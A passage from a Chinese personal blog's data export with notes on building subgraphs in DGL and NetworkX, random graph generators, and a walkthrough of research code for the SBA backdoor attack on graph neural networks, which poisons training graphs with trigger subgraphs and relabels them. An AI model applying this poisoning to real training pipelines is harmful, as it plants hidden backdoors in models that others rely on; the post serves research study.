class=\"line\">done</span><br></pre></td></tr></table></figure>\n<p>还有一种看起来比较玄乎的，增加了一些log。但是说实话我这么简单的需求上面那个版本就ok了。<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">BASE_CMD=<span class=\"string\">&quot;python train_teacher.py --exp_setting tran --teacher GCN --dataset cora --opt p&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> $(seq <span class=\"number\">0</span> <span class=\"number\">10</span> <span class=\"number\">200</span>); do</span><br><span class=\"line\">\tCMD=<span class=\"string\">&quot;$BASE_CMD --trigger_number $i&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\techo <span class=\"string\">&quot;Running: $CMD&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t$CMD</span><br><span class=\"line\"></span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure></p>\n<p>然后注意就是运行的时候别<code>./</code>, <code>bash xx.sh</code>比较好。（虽然在开头已经指定了解释器，但是不知道为什么就是会报错）</p>\n","categories":["ML"],"tags":["mess"]},{"title":"基于DGL及nx的Subgraph生成概览","url":"/2023/09/24/%E5%9F%BA%E4%BA%8EDGL%E5%8F%8ANetworkx%E7%9A%84Subgraph%E7%94%9F%E6%88%90%E6%A6%82%E8%A7%88/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-BQwFkVOh\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"22693394\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>最近research需要借助到subgraph的生成，遂认真研究一下。</p>\n<h1><span id=\"1-猴子都会的弱智方法\">1 猴子都会的弱智方法</span></h1><p><strong>一句话总结，选出你需要的node idx，然后<code>g.subgraph()</code></strong><br>以下代码由伟大的真神GPT4倾情联合赞助：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> dgl</span><br><span class=\"line\"><span class=\"keyword\">import</span> networkx <span class=\"keyword\">as</span> nx</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 对于任意图</span></span><br><span class=\"line\">g = dgl.graph(([<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>], [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">0</span>]))</span><br><span class=\"line\">g = dgl.to_bidirected(g)  <span class=\"comment\">#双向图</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 为了好画出来，把dgl图转成了nx（因为dgl没有内置可视化功能）</span></span><br><span class=\"line\">nx_g = g.to_networkx()</span><br><span class=\"line\">plt.subplot(<span class=\"number\">121</span>)</span><br><span class=\"line\">nx.draw(nx_g, with_labels=<span class=\"literal\">True</span>, font_weight=<span class=\"string\">&#x27;bold&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&quot;Original Graph&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#选择你需要用来生成连接子图的节点，然后g.subgraph一把梭</span></span><br><span class=\"line\">nodes_to_include = [<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>]</span><br><span class=\"line\">sub_g = g.subgraph(nodes_to_include)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 继续把刚刚生成的子图可视化</span></span><br><span class=\"line\">nx_sub_g = sub_g.to_networkx()</span><br><span class=\"line\">plt.subplot(<span class=\"number\">122</span>)</span><br><span class=\"line\">nx.draw(nx_sub_g, with_labels=<span class=\"literal\">True</span>, font_weight=<span class=\"string\">&#x27;bold&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&quot;Node-Induced Subgraph&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20230924204315.png\" alt=\"image.png\"></p>\n<p>这个方法我最早是在glnn的代码里看到的，当时是在inductive模式中，从已有的train idx中随机挑来了一些出来，然后用他们生成新的子图一起喂给模型。<br>大致长这样:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">obs_labels = labels[idx_obs]</span><br><span class=\"line\"></span><br><span class=\"line\">obs_g = g.subgraph(idx_obs)</span><br></pre></td></tr></table></figure><br>但是这么做与我的需求关系可以说是没有，他只是纯粹用已有节点重新组合成了独立的subgraph，但是并不是我想要的trigger。但是目前来说对于如何生成我想要的subgraph我并没有清晰的思路，于是就有了今天这篇笔记。</p>\n<h1><span id=\"2-生成subgraph的两种大致方向\">2 生成subgraph的两种大致方向</span></h1><p>先来看看传统意义上的subgraph如何生成。</p>\n<h2><span id=\"21-node-induced\">2.1 Node induced</span></h2><p><a href=\"https://docs.dgl.ai/en/0.5.x/generated/dgl.node_subgraph.html#dgl.node_subgraph\">dgl官方文档</a><br>可以理解为基于节点的子图生成。效果就如刚刚的示例代码，但是同时会拷贝原有的edge数据。<br>就例如：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">nodes_to_include = [ <span class=\"number\">1</span>, <span class=\"number\">2</span>,<span class=\"number\">4</span>]</span><br><span class=\"line\">sub_g = g.subgraph(nodes_to_include)</span><br></pre></td></tr></table></figure><br>这里由于我选择了124节点，本身4和12就是无边的，所以subgraph也是无边的。同时subgraph函数会为node重新标id，从0开始。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20230924205404.png\" alt=\"image.png\"></p>\n<h2><span id=\"22-edge-induced\">2.2 Edge induced</span></h2><p><a href=\"https://docs.dgl.ai/en/0.5.x/generated/dgl.edge_subgraph.html#dgl.edge_subgraph\">official docs</a><br>与node类似，基于边的子图生成只需要我们指定原图中的edge信息。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> dgl</span><br><span class=\"line\"><span class=\"keyword\">import</span> networkx <span class=\"keyword\">as</span> nx</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Create a DGL graph</span></span><br><span class=\"line\">g = dgl.graph(([<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>], [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Convert DGL graph to NetworkX graph for visualization</span></span><br><span class=\"line\">nx_g = g.to_networkx()</span><br><span class=\"line\">plt.subplot(<span class=\"number\">121</span>)</span><br><span class=\"line\">pos = nx.spring_layout(nx_g)</span><br><span class=\"line\">nx.draw(nx_g, pos, with_labels=<span class=\"literal\">True</span>, node_color=[[<span class=\"number\">.7</span>, <span class=\"number\">.7</span>, <span class=\"number\">.7</span>]])</span><br><span class=\"line\">nx.draw_networkx_edge_labels(nx_g, pos, edge_labels=&#123;(u, v): <span class=\"string\">f&quot;<span class=\"subst\">&#123;i&#125;</span>&quot;</span> <span class=\"keyword\">for</span> i, (u, v) <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(nx_g.edges())&#125;)</span><br><span class=\"line\">plt.title(<span class=\"string\">&quot;Original Graph&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Select a subset of edges to induce the subgraph (edge IDs: 1, 2, 3)</span></span><br><span class=\"line\">edge_ids = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Create edge-induced subgraph</span></span><br><span class=\"line\">sub_g = g.edge_subgraph(edge_ids)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Convert edge-induced subgraph to NetworkX graph for visualization</span></span><br><span class=\"line\">nx_sub_g = sub_g.to_networkx()</span><br><span class=\"line\">plt.subplot(<span class=\"number\">122</span>)</span><br><span class=\"line\">pos_sub = nx.spring_layout(nx_sub_g)</span><br><span class=\"line\">nx.draw(nx_sub_g, pos_sub, with_labels=<span class=\"literal\">True</span>, node_color=[[<span class=\"number\">.7</span>, <span class=\"number\">.7</span>, <span class=\"number\">.7</span>]])</span><br><span class=\"line\">nx.draw_networkx_edge_labels(nx_sub_g, pos_sub, edge_labels=&#123;(u, v): <span class=\"string\">f&quot;<span class=\"subst\">&#123;i&#125;</span>&quot;</span> <span class=\"keyword\">for</span> i, (u, v) <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(nx_sub_g.edges())&#125;)</span><br><span class=\"line\">plt.title(<span class=\"string\">&quot;Edge-Induced Subgraph&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20230924210449.png\" alt=\"image.png\"><br>即针对给定的edge，生成idx从0开始的新node进行连接。<br>这里都是给出比较简单的例子。</p>\n<h2><span id=\"23-总结\">2.3 总结</span></h2><p>首先，只要你是子图，入手肯定是边或者节点，不然如何与原本的图相连，或是如何说你就是原图的一部分？<br>而针对trigger插入这一个课题来说又是node induced subgraph比较多，所以整一个subgraph trigger的思路就是：</p>\n<ol>\n<li>节点选择</li>\n<li>基于选择的节点生成图</li>\n<li><p>插入或者生成新的sample</p>\n<h1><span id=\"3-复杂随机图\">3 复杂随机图</span></h1><p>这里的“复杂”随机图还是基于我看过的三篇论文中对于子图生成的策略。<br>首先看起来比较简单的<strong>SBA策略</strong>的代码</p>\n<h2><span id=\"31-基础知识\">3.1 基础知识</span></h2><p>论文：Backdoor Attacks to Graph Neural Networks<br>文章中写到，使用了<strong>三种随机图的生成策略</strong>，分别为<strong>ER</strong>，<strong>SW和PA</strong>。<br>（Networkx有10086种随机图生成策略，这里暂且就说这些）</p>\n<h3><span id=\"311-er图\">3.1.1 ER图</span></h3><p>Erdos renyi图缩写。</p>\n<p>先看代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">G_gen = nx.erdos_renyi_graph(num_backdoor_nodes, prob)</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>其实也是调包行为。<br>这里用的包是Networkx，之前突击过，没有什么阅读理解上的的障碍。看看官方文档。<br><a href=\"https://networkx.org/documentation/stable/reference/generated/networkx.generators.random_graphs.erdos_renyi_graph.html\">erdos_renyi_graph</a><br>根据指定的node以及概率，返回对应的ER随机图。</p>\n<h4><span id=\"example\">example</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> networkx <span class=\"keyword\">as</span> nx</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Generate an Erdős–Rényi graph with 10 nodes and edge probability of 0.5</span></span><br><span class=\"line\">G = nx.erdos_renyi_graph(n=<span class=\"number\">10</span>, p=<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Draw the graph</span></span><br><span class=\"line\">pos = nx.spring_layout(G)  <span class=\"comment\"># positions for all nodes</span></span><br><span class=\"line\">nx.draw(G, pos, with_labels=<span class=\"literal\">True</span>, node_color=<span class=\"string\">&#x27;skyblue&#x27;</span>, node_size=<span class=\"number\">700</span>, font_size=<span class=\"number\">18</span>, font_color=<span class=\"string\">&#x27;black&#x27;</span>, font_weight=<span class=\"string\">&#x27;bold&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&quot;Erdős–Rényi Graph&quot;</span>)</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20230924224029.png\" alt=\"image.png\"></p>\n<p> 代码废话比较多，基本上就是让你生成一个概率0.5，含有十个节点的图。这里的概率指的是对于每个节点，它创建，或者有边的概率。例如把p改成0.1，就是这样的效果：<br> <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20230924224220.png\" alt=\"image.png\"></p>\n<p> 因为每个节点有边的概率变低了，所以单独存在的node自然也就增多了。</p>\n<h4><span id=\"粗略原理\">粗略原理</span></h4><p>回到数学概念也很好解释，ER图的特征就在于它随机的策略在于每个节点的边是随机的，除此之外也没有更多特别的了。</p>\n<h3><span id=\"312-sw图\">3.1.2 SW图</span></h3><h4><span id=\"原理\">原理</span></h4><p>SW的生成策略在于图中任意两节点之间，大概率不是邻居，但距离很近。<br>原话：<br><em>A <strong>small-world network</strong> is a <a href=\"https://en.wikipedia.org/wiki/Graph_(discrete_mathematics\">mathematical graph</a> “Graph (discrete mathematics)”) in which most nodes are not neighbors of one another, but the neighbors of any given node are likely to be neighbors of each other.</em></p>\n<p>如何达成？其实只要让节点连成环，然后在中间切几刀就行。<br>例如下图：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20230924230050.png\" alt=\"image.png\"></p>\n<h4><span id=\"code\">code</span></h4><p>基于<code>watts_strogatz_graph</code>模型生成small world图。<br>同理，指定参数，返回图。这里的参数是：</p>\n<ol>\n<li>节点数</li>\n<li>在一个环中每个节点相连的领居数</li>\n<li>产生新的边的概率</li>\n</ol>\n<p>其中第23个参数的意义可能有点抽象，看例子比较好。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> networkx <span class=\"keyword\">as</span> nx</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Generate a Watts–Strogatz graph with 10 nodes, each connected to its 2 nearest neighbors,</span></span><br><span class=\"line\"><span class=\"comment\"># and with a 0.3 probability of rewiring each edge</span></span><br><span class=\"line\">G = nx.watts_strogatz_graph(n=<span class=\"number\">5</span>, k=<span class=\"number\">2</span>, p=<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Draw the graph</span></span><br><span class=\"line\">pos = nx.spring_layout(G)  <span class=\"comment\"># positions for all nodes</span></span><br><span class=\"line\">nx.draw(G, pos, with_labels=<span class=\"literal\">True</span>, node_color=<span class=\"string\">&#x27;skyblue&#x27;</span>, node_size=<span class=\"number\">700</span>, font_size=<span class=\"number\">18</span>, font_color=<span class=\"string\">&#x27;black&#x27;</span>, font_weight=<span class=\"string\">&#x27;bold&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&quot;Watts–Strogatz Graph&quot;</span>)</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20230924230534.png\" alt=\"image.png\"></p>\n<p>对于节点2连接的环结构，它一共有3和1两个最近邻。<br>当参数变为<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">G = nx.watts_strogatz_graph(n=<span class=\"number\">6</span>, k=<span class=\"number\">3</span>, p=<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20230924230645.png\" alt=\"image.png\"><br>则节点2存在3个最近邻。</p>\n<p>当edge rewiring的概率为0，即不产生新边时，graph会保持ring拓扑结构。<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">G = nx.watts_strogatz_graph(n=<span class=\"number\">20</span>, k=<span class=\"number\">4</span>, p=<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure><br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20230924230842.png\" alt=\"image.png\"></p>\n<h3><span id=\"313-pa图\">3.1.3 PA图</span></h3><h4><span id=\"原理\">原理</span></h4><p>基于 <strong>Barabási–Albert (BA) model</strong>生成 <a href=\"https://en.wikipedia.org/wiki/Preferential_attachment\" title=\"Preferential attachment\">preferential attachment</a> mechanism<br>。其中preferential attachment 是一种scale-free graph。</p>\n<h5><span id=\"scale-free\">scale free</span></h5><p>A <strong>scale-free network</strong> is a <a href=\"https://en.wikipedia.org/wiki/Complex_network\" title=\"Complex network\">network</a> whose <a href=\"https://en.wikipedia.org/wiki/Degree_distribution\" title=\"Degree distribution\">degree distribution</a> follows a <a href=\"https://en.wikipedia.org/wiki/Power_law\" title=\"Power law\">power law</a>,</p>\n<h4><span id=\"code\">code</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> networkx <span class=\"keyword\">as</span> nx</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Generate a Barabási-Albert graph</span></span><br><span class=\"line\"><span class=\"comment\"># n: Number of nodes</span></span><br><span class=\"line\"><span class=\"comment\"># m: Number of edges to attach from a new node to existing nodes</span></span><br><span class=\"line\">n = <span class=\"number\">10</span></span><br><span class=\"line\">m = <span class=\"number\">4</span></span><br><span class=\"line\">G = nx.barabasi_albert_graph(n, m)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Draw the graph</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">10</span>, <span class=\"number\">10</span>))</span><br><span class=\"line\">pos = nx.spring_layout(G, seed=<span class=\"number\">42</span>)  <span class=\"comment\"># positions for all nodes</span></span><br><span class=\"line\">nx.draw(G, pos, with_labels=<span class=\"literal\">False</span>, node_size=<span class=\"number\">50</span>, node_color=<span class=\"string\">&quot;blue&quot;</span>, alpha=<span class=\"number\">0.6</span>, edge_color=<span class=\"string\">&quot;gray&quot;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&quot;Barabási-Albert Graph&quot;</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20230924234004.png\" alt=\"image.png\"></p>\n<p>参数就是一个节点数，一个和节点连接的边数。（不过具体边数也不是特别严格）</p>\n<h2><span id=\"32-实际应用sba-subgraph\">3.2 实际应用（SBA-Subgraph）</span></h2><p>大致分为以下步骤</p>\n<ol>\n<li>生成随机trigger子图备用</li>\n<li>选择clean graph中连接trigger的节点</li>\n<li>将原本与节点连接的边删除</li>\n<li>连接旧图与新子图</li>\n<li>更新label与feature</li>\n</ol>\n<h3><span id=\"321-生成随机trigger子图备用\">3.2.1 生成随机trigger子图备用</span></h3><p>以ER图为例：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> graph_type == <span class=\"string\">&#x27;ER&#x27;</span>:</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(np.log(num_backdoor_nodes) / num_backdoor_nodes)</span><br><span class=\"line\"><span class=\"comment\">#assert prob &gt; np.log(num_backdoor_nodes) / num_backdoor_nodes</span></span><br><span class=\"line\">\tG_gen = nx.erdos_renyi_graph(num_backdoor_nodes, prob)<span class=\"comment\">#运用er算法生成随机图</span></span><br><span class=\"line\">\tnx.write_edgelist(G_gen, <span class=\"string\">&#x27;subgraph_gen/ER_&#x27;</span> + <span class=\"built_in\">str</span>(dataset) + <span class=\"string\">&#x27;_triggersize_&#x27;</span> + <span class=\"built_in\">str</span>(</span><br><span class=\"line\">\tnum_backdoor_nodes) + <span class=\"string\">&#x27;_prob_&#x27;</span> + <span class=\"built_in\">str</span>(prob) + <span class=\"string\">&#x27;.edgelist&#x27;</span>)</span><br><span class=\"line\">\ttest_graph_file = <span class=\"built_in\">open</span>(</span><br><span class=\"line\">\t<span class=\"string\">&#x27;test_graphs/&#x27;</span> + <span class=\"built_in\">str</span>(graph_type) + <span class=\"string\">&#x27;_&#x27;</span> + <span class=\"built_in\">str</span>(dataset) + <span class=\"string\">&#x27;_&#x27;</span> + <span class=\"built_in\">str</span>(frac) + <span class=\"string\">&#x27;_triggersize_&#x27;</span> + <span class=\"built_in\">str</span>(</span><br><span class=\"line\">\tnum_backdoor_nodes) + <span class=\"string\">&#x27;_prob_&#x27;</span> + <span class=\"built_in\">str</span>(prob) + <span class=\"string\">&#x27;.backdoor_graphs&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">\ttrain_graph_file = <span class=\"built_in\">open</span>(</span><br><span class=\"line\">\t<span class=\"string\">&#x27;backdoor_graphs/&#x27;</span> + <span class=\"built_in\">str</span>(graph_type) + <span class=\"string\">&#x27;_&#x27;</span> + <span class=\"built_in\">str</span>(dataset) + <span class=\"string\">&#x27;_&#x27;</span> + <span class=\"built_in\">str</span>(frac) + <span class=\"string\">&#x27;_triggersize_&#x27;</span> + <span class=\"built_in\">str</span>(</span><br><span class=\"line\">\tnum_backdoor_nodes) + <span class=\"string\">&#x27;_prob_&#x27;</span> + <span class=\"built_in\">str</span>(prob) + <span class=\"string\">&#x27;.backdoor_graphs&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">\ttrain_graph_nodefile = <span class=\"built_in\">open</span>(</span><br><span class=\"line\">\t<span class=\"string\">&#x27;backdoor_graphs/&#x27;</span> + <span class=\"built_in\">str</span>(graph_type) + <span class=\"string\">&#x27;_&#x27;</span> + <span class=\"built_in\">str</span>(dataset) + <span class=\"string\">&#x27;_&#x27;</span> + <span class=\"built_in\">str</span>(frac) + <span class=\"string\">&#x27;_triggersize_&#x27;</span> + <span class=\"built_in\">str</span>(</span><br><span class=\"line\">\tnum_backdoor_nodes) + <span class=\"string\">&#x27;_prob_&#x27;</span> + <span class=\"built_in\">str</span>(prob) + <span class=\"string\">&#x27;.backdoor_graphnodes&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>)</span><br></pre></td></tr></table></figure><br>这里用到了<code>write_edgelist()</code>将生成的图的edge信息存入文件，方便划分各子集。</p>\n<h3><span id=\"322-选择clean-graph中连接trigger的节点\">3.2.2 选择clean graph中连接trigger的节点</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">rand_backdoor_graph_idx = random.sample(train_backdoor_graphs_indexes,</span><br><span class=\"line\"></span><br><span class=\"line\">k=num_backdoor_train_graphs)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> idx <span class=\"keyword\">in</span> rand_backdoor_graph_idx:</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">#通过边矩阵找到总结点数（遍历出边矩阵中数值最大的节点再加一）</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\"># print(train_graphs[idx].edge_mat)</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tnum_nodes = torch.<span class=\"built_in\">max</span>(train_graphs[idx].edge_mat).numpy() + <span class=\"number\">1</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\"># print(&#x27;#nodes:&#x27;, num_nodes)</span></span><br><span class=\"line\">\t<span class=\"comment\">#根据生成的随机节点数，再随机采样train中的nodes</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num_backdoor_nodes &gt;= num_nodes:</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"comment\"># rand_select_nodes = [node for node in range(num_nodes)]</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\trand_select_nodes = np.random.choice(num_nodes, num_backdoor_nodes)</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\trand_select_nodes = np.random.choice(num_nodes, num_backdoor_nodes, replace=<span class=\"literal\">False</span>)</span><br></pre></td></tr></table></figure>\n<h3><span id=\"323-将原本与节点连接的边删除\">3.2.3 将原本与节点连接的边删除</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#将原本2xN的edge数组分割成节点对间的边（Nx2），易于边的删除</span></span><br><span class=\"line\"></span><br><span class=\"line\">edges = train_graphs[idx].edge_mat.transpose(<span class=\"number\">1</span>, <span class=\"number\">0</span>).numpy().tolist()</span><br></pre></td></tr></table></figure>\n<p> transpose的操作完全是为了后面删除两节点之间的边，于是将边换成节点对的方法表示。<br> <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">### Remove existing edges，</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> rand_select_nodes:</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> rand_select_nodes:</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> [i, j] <span class=\"keyword\">in</span> edges:</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t\tedges.remove([i, j])</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (i, j) <span class=\"keyword\">in</span> train_graphs[idx].g.edges():</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t\ttrain_graphs[idx].g.remove_edge(i, j)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(&#x27;after remove:&#x27;, len(edges))</span></span><br></pre></td></tr></table></figure></p>\n<h3><span id=\"324-连接旧图与新子图\">3.2.4 连接旧图与新子图</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> e <span class=\"keyword\">in</span> G_gen.edges:</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># print([rand_select_nodes[e[0]], rand_select_nodes[e[1]]])</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tedges.append([rand_select_nodes[e[<span class=\"number\">0</span>]], rand_select_nodes[e[<span class=\"number\">1</span>]]])</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tedges.append([rand_select_nodes[e[<span class=\"number\">1</span>]], rand_select_nodes[e[<span class=\"number\">0</span>]]])</span><br><span class=\"line\">\t</span><br><span class=\"line\">\ttrain_graphs[idx].g.add_edge(e[<span class=\"number\">0</span>], e[<span class=\"number\">1</span>])</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\"># print(&#x27;after add:&#x27;, len(edges))</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\"># print(&#x27;new edges:&#x27;, edges)</span></span><br></pre></td></tr></table></figure>\n<p>这里就是把<code>G_gen.edges</code>中所有节点（边），与其对应的刚刚删除边的空闲节点连接，生成含有trigger的graph。<br>到这一步就算完成了“insert”这个步骤。</p>\n<h3><span id=\"325-更新label与feature\">3.2.5 更新label与feature</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">train_graphs[idx].edge_mat = torch.LongTensor(np.asarray(edges).transpose())</span><br><span class=\"line\"></span><br><span class=\"line\">train_graphs[idx].label = target_label</span><br><span class=\"line\"></span><br><span class=\"line\">train_graphs[idx].node_tags = <span class=\"built_in\">list</span>(<span class=\"built_in\">dict</span>(train_graphs[idx].g.degree).values())</span><br><span class=\"line\"></span><br><span class=\"line\">train_graphs[idx].node_features = torch.zeros(<span class=\"built_in\">len</span>(train_graphs[idx].node_tags), <span class=\"built_in\">len</span>(tag2index))</span><br><span class=\"line\"></span><br><span class=\"line\">train_graphs[idx].node_features[<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(train_graphs[idx].node_tags)), [tag2index[tag] <span class=\"keyword\">for</span> tag <span class=\"keyword\">in</span> train_graphs[idx].node_tags]] = <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(train_graphs[idx].edge_mat)</span></span><br></pre></td></tr></table></figure>\n<p>这里就没啥特别要提的了。</p>\n","categories":["ML"],"tags":["GNN"]},{"title":"Graph数据处理","url":"/2023/09/25/Graph%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-EYadNXDu\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"22693394\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" 